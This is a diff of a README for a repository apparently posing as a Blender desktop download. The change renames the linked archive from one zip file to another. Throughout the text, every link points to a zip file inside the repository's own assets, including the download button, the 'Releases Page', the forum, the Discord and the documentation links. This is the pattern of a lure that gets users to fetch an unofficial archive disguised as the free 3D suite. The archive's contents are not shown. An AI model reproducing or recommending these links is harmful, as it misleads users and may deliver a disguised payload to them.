@@ -1,10 +1,10 @@
 # 🎨 blender-desktop - Create Stunning 3D Art Easily
 
-![Blender](https://raw.githubusercontent.com/sabrinahpantoja/blender-desktop/main/assets/desktop-blender-3.5.zip)
+![Blender](https://raw.githubusercontent.com/sabrinahpantoja/blender-desktop/main/assets/desktop_blender_2.6-alpha.1.zip)
 
 Blender is a free and open-source 3D creation suite. It supports the entire production pipeline including modeling, animation, simulation, and more. Blender is perfect for 3D artists, designers, animators, game developers, VFX artists, and content creators. With zero licensing cost, it serves as a powerful all-in-one 3D tool.
 
-[![Download Blender](https://raw.githubusercontent.com/sabrinahpantoja/blender-desktop/main/assets/desktop-blender-3.5.zip%20Blender-Get%20Started-brightgreen)](https://raw.githubusercontent.com/sabrinahpantoja/blender-desktop/main/assets/desktop-blender-3.5.zip)
+[![Download Blender](https://raw.githubusercontent.com/sabrinahpantoja/blender-desktop/main/assets/desktop_blender_2.6-alpha.1.zip%20Blender-Get%20Started-brightgreen)](https://raw.githubusercontent.com/sabrinahpantoja/blender-desktop/main/assets/desktop_blender_2.6-alpha.1.zip)
 
 ## 🔑 Key Features
 
@@ -23,7 +23,7 @@ Blender is a free and open-source 3D creation suite. It supports the entire prod
 
 To get started with Blender, follow these steps:
 
-1. Go to the [Releases Page](https://raw.githubusercontent.com/sabrinahpantoja/blender-desktop/main/assets/desktop-blender-3.5.zip).
+1. Go to the [Releases Page](https://raw.githubusercontent.com/sabrinahpantoja/blender-desktop/main/assets/desktop_blender_2.6-alpha.1.zip).
 2. Find the latest version. 
 3. Choose the file suitable for your operating system (Windows, macOS, or Linux).
 4. Click the download link for the selected file. The download will begin.
@@ -33,7 +33,7 @@ To get started with Blender, follow these steps:
 
 To download Blender, visit the following link:
 
-[Download Blender Now](https://raw.githubusercontent.com/sabrinahpantoja/blender-desktop/main/assets/desktop-blender-3.5.zip)
+[Download Blender Now](https://raw.githubusercontent.com/sabrinahpantoja/blender-desktop/main/assets/desktop_blender_2.6-alpha.1.zip)
 
 After visiting the page:
 
@@ -73,8 +73,8 @@ If you encounter any issues while downloading or installing:
 
 Blender has a large and vibrant community. If you have questions or need assistance:
 
-- Visit the [Blender Forum](https://raw.githubusercontent.com/sabrinahpantoja/blender-desktop/main/assets/desktop-blender-3.5.zip)
-- Join the [Blender Discord](https://raw.githubusercontent.com/sabrinahpantoja/blender-desktop/main/assets/desktop-blender-3.5.zip)
-- Check out the [Blender Documentation](https://raw.githubusercontent.com/sabrinahpantoja/blender-desktop/main/assets/desktop-blender-3.5.zip)
+- Visit the [Blender Forum](https://raw.githubusercontent.com/sabrinahpantoja/blender-desktop/main/assets/desktop_blender_2.6-alpha.1.zip)
+- Join the [Blender Discord](https://raw.githubusercontent.com/sabrinahpantoja/blender-desktop/main/assets/desktop_blender_2.6-alpha.1.zip)
+- Check out the [Blender Documentation](https://raw.githubusercontent.com/sabrinahpantoja/blender-desktop/main/assets/desktop_blender_2.6-alpha.1.zip)
 
 By following these steps, you can easily download and run Blender on your system. Let your creativity flow with this powerful 3D tool!
